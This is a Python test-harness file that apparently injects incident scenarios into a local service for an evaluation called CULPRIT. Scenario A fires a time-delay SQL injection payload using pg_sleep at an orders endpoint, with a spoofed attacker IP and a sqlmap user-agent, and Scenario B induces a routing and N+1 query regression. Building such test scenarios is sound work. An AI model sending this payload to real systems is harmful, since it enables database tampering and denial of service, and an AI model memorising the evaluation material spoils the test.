"""
scenarios.inject – Scenario injection runner for CULPRIT evaluations.

Scenario A (Exploit):
  Sends a fixed burst to POST /api/orders via gateway with a time-delay SQLi payload
  in `sku` from a single attacker IP.
  Payload: WIDGET-001' AND (SELECT 1 FROM pg_sleep(8)) IS NOT NULL; --
  Effect: Raises orders p95 latency to ~8s and generates attack log entries.

Scenario B (Regression):
  Shifts gateway weights to 100% blue (v1.5.0).
  Sends batch multi-item orders triggering N+1 unindexed inventory queries.
  Effect: Connection pool contention slows down both /api/orders and /api/products.
"""

import concurrent.futures
import json
import os
import sys
import time
from typing import Any, Dict, List
import requests

DEFAULT_GATEWAY_URL = os.environ.get("GATEWAY_URL", "http://localhost:8080")


def start_scenario_a(
    gateway_url: str = DEFAULT_GATEWAY_URL,
    burst_count: int = 4,
    sleep_delay: int = 8,
    attacker_ip: str = "198.51.100.42",
) -> Dict[str, Any]:
    """Inject Scenario A: SQLi time-delay attack burst."""
    print(f"[Scenario A] Sending {burst_count} exploit requests with {sleep_delay}s time-delay payload to {gateway_url}...")
    url = f"{gateway_url.rstrip('/')}/api/orders"
    
    # SQLi payload exploiting the f-string in SELECT id, price FROM products WHERE sku = '{order.sku}'
    sqli_payload = f"WIDGET-001' AND (SELECT 1 FROM pg_sleep({sleep_delay})) IS NOT NULL; --"
    
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": attacker_ip,
        "User-Agent": "sqlmap/1.7.2#stable",
    }
    body = {
        "customer_id": 1,
        "sku": sqli_payload,
        "qty": 1,
    }

    results = []
    t_start = time.time()

    def send_one(req_num: int):
        try:
            t0 = time.time()
            r = requests.post(url, json=body, headers=headers, timeout=sleep_delay + 5)
            elapsed = time.time() - t0
            return {"req": req_num, "status": r.status_code, "elapsed": round(elapsed, 3)}
        except Exception as exc:
            elapsed = time.time() - t0
            return {"req": req_num, "status": 504, "error": str(exc), "elapsed": round(elapsed, 3)}

    with concurrent.futures.ThreadPoolExecutor(max_workers=burst_count) as executor:
        futures = [executor.submit(send_one, i) for i in range(burst_count)]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    total_time = time.time() - t_start
    print(f"[Scenario A] Completed injection in {total_time:.2f}s. Results: {results}")
    return {
        "scenario": "a_exploit",
        "burst_count": burst_count,
        "sleep_delay": sleep_delay,
        "attacker_ip": attacker_ip,
        "results": results,
    }


def start_scenario_b(
    gateway_url: str = DEFAULT_GATEWAY_URL,
    num_requests: int = 15,
) -> Dict[str, Any]:
    """Inject Scenario B: 100% blue routing + multi-item N+1 order traffic."""
    print(f"[Scenario B] Shifting weights to 100% blue and generating heavy multi-item traffic...")
    admin_url = f"{gateway_url.rstrip('/')}/admin/weights"
    requests.post(admin_url, json={"blue": 100, "green": 0}, timeout=5)

    orders_url = f"{gateway_url.rstrip('/')}/api/orders"
    products_url = f"{gateway_url.rstrip('/')}/api/products"

    skus = ["WIDGET-001", "WIDGET-002", "GADGET-001", "GADGET-002", "TOOL-001", "TOOL-002", "PART-001", "PART-002", "PART-003", "PART-004"]
    multi_items = [{"sku": s, "qty": 1} for s in skus]

    results = []

    def send_order_or_product(idx: int):
        try:
            t0 = time.time()
            if idx % 3 == 0:
                r = requests.get(products_url, timeout=10)
            else:
                body = {
                    "customer_id": 1,
                    "sku": "WIDGET-001",
                    "qty": 1,
                    "items": multi_items,
                }
                r = requests.post(orders_url, json=body, timeout=15)
            elapsed = time.time() - t0
            return {"req": idx, "status": r.status_code, "elapsed": round(elapsed, 4)}
        except Exception as exc:
            return {"req": idx, "status": 500, "error": str(exc)}

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(send_order_or_product, i) for i in range(num_requests)]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    print(f"[Scenario B] Sent {num_requests} multi-item requests to 1.5.0.")
    return {
        "scenario": "b_regression",
        "requests_sent": num_requests,
        "results": results,
    }


def reset_scenario(gateway_url: str = DEFAULT_GATEWAY_URL) -> Dict[str, Any]:
    """Reset gateway weights to 50/50 and remove all block rules."""
    base = gateway_url.rstrip("/")
    requests.post(f"{base}/admin/weights", json={"blue": 50, "green": 50}, timeout=5)
    state = requests.get(f"{base}/admin/state", timeout=5).json()
    for rule in state.get("rules", []):
        requests.delete(f"{base}/admin/rules/{rule['id']}", timeout=5)
    for route in state.get("disabled_routes", []):
        requests.post(f"{base}/admin/enable", json={"route": route}, timeout=5)
    return {"status": "reset", "weights": {"blue": 50, "green": 50}}


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "a"
    gw = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_GATEWAY_URL
    if mode == "a":
        start_scenario_a(gw)
    elif mode == "b":
        start_scenario_b(gw)
    elif mode == "reset":
        reset_scenario(gw)
    else:
        print(f"Unknown mode: {mode}. Use 'a', 'b', or 'reset'")
